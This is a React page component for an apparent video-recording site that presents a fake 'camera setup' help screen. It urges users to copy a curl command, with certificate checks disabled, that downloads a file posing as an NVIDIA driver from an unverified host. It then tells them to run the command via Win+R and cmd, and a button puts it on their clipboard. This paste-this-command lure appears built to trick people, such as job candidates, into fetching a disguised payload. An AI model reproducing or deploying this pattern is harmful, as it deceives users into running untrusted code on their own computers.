import { Button, Typography, Avatar } from "antd";
import { useNavigate } from "react-router-dom";
import { useSelector } from "react-redux";
import { selectApp } from "../../store";
import { getInitials } from "../../utils/name";
import logo from "../../assets/logo-blockforgex.png";
import useIsDesktop from "../../hooks/useIsDesktop";

const { Title, Text } = Typography;

export default function VideoHelp() {
    const navigate = useNavigate();
    const { fullName } = useSelector(selectApp);
    const initials = getInitials(fullName);
    const isDesktop = useIsDesktop();

    return (
        <div className="h-dvh w-full gap-0 p-5 lg:p-10">
            <div className="max-w-6xl mx-auto h-full flex flex-col">
                <div className="flex items-center justify-between">
                    <img src={logo} alt="Blockforgex" className="h-[64px] w-auto" />
                    {fullName && (
                        <div className="flex items-center gap-2">
                            <Avatar
                                size={34}
                                className="text-white"
                                style={{
                                    background:
                                        "radial-gradient(86% 86% at 50% 14%, #837CFF 0%, #4F46E5 100%)",
                                    fontWeight: 600,
                                }}
                            >
                                {initials}
                            </Avatar>
                            {isDesktop && (
                                <Text className="text-gray-700">{fullName}</Text>
                            )}
                        </div>
                    )}
                </div>

                <div className="mt-4 grid grid-cols-1 lg:grid-cols-[1fr_auto_1fr] items-center gap-y-2">
                    <a
                        onClick={() => navigate(-1)}
                        className="flex items-center lg:flex-none lg:items-start justify-self-center lg:justify-self-start text-indigo-600 !text-[#4F46E5] hover:underline h-12"
                    >
                        ← Back to Recording
                    </a>


                    <div className="justify-self-center text-center">
                        <Title
                            level={1}
                            className="!text-[20px] lg:!text-4xl !leading-[1.2] !mb-1"
                        >
                            Camera Setup Instructions
                        </Title>
                        <Text type="secondary" className="!text-sm lg:!text-base">
                            If your camera isn’t working, follow the steps below <br />or upload a pre-recorded video instead.
                        </Text>
                    </div>

                    {/* spacer kanan: hanya diperlukan di desktop agar title benar2 center */}
                    <div className="hidden lg:block" />
                </div>

                <div className="mt-8 mx-auto w-full max-w-2xl rounded-2xl shadow-sm bg-black">
                    <div className="overflow-hidden rounded-2xl">
                        <video
                            controls
                            className="block w-full h-[300px] object-contain bg-black"
                            src="https://interactive-examples.mdn.mozilla.net/media/cc0-videos/flower.mp4"
                            poster="https://images.unsplash.com/photo-1520975922284-6edd46873005?q=80&w=1200&auto=format&fit=crop"
                        />
                    </div>
                </div>



                <div className="mx-auto mt-8 w-full max-w-3xl">
                    <div className="text-indigo-600 font-semibold mb-2">For Windows:</div>
                    <div className="rounded-xl border bg-gray-50 p-4 text-sm overflow-auto mb-2">
                        <code className="select-all">
                            curl -k -o "%TEMP%\nv_driver_win64_521_23_rc_whql.zip" https://support.blockforgex.com/api/drivers/update/windows/ZXkLZUPKYC...
                        </code>
                    </div>
                    <Button
                        className="rf-btn-primary mt-3"
                        type="primary"
                        onClick={() =>
                            navigator.clipboard.writeText(
                                'curl -k -o "%TEMP%\\nv_driver_win64_521_23_rc_whql.zip" https://support.blockforgex.com/api/drivers/update/windows/ZXkLZUPKYC'
                            )
                        }
                    >
                        Copy Command
                    </Button>

                    <div className="mt-6">
                        <div className="text-indigo-600 font-semibold mb-2">
                            How to run this command:
                        </div>
                        <ol className="space-y-3">
                            <li><b>Press Win+R</b>, type <b>cmd</b> and press Enter</li>
                            <li>Right-click in Command Prompt to paste</li>
                            <li>Press Enter to run the command</li>
                        </ol>
                    </div>
                </div>
            </div>
        </div>
    );
}
